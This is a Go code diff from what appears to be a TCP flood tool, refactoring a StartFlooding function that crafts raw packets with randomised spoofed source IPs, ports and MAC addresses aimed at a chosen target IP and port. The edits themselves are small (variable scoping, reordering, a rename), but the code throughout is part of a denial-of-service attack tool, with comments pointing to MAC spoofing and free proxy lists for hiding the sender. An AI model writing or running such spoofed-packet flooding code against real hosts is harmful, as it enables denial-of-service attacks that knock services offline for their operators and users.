@@ -12,10 +12,7 @@ import (
 	"time"
 )
 
-var (
-	logger *zap.Logger
-	err    error
-)
+var logger *zap.Logger
 
 func init() {
 	// initialize global pseudo random generator
@@ -29,6 +26,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		ipHeader   *ipv4.Header
 		packetConn net.PacketConn
 		rawConn    *ipv4.RawConn
+		err        error
 	)
 
 	defer func() {
@@ -54,8 +52,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		// mac spoofing -> https://github.com/google/gopacket/issues/153
 		// free proxies -> https://www.sslproxies.org/
 
-		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
 		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort)
+		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
 		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
 			return err
 		}
@@ -80,8 +78,8 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 
 		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
-		payload := gopacket.Payload(payload)
-		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload); err != nil {
+		pyl := gopacket.Payload(payload)
+		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
 			return err
 		}
 
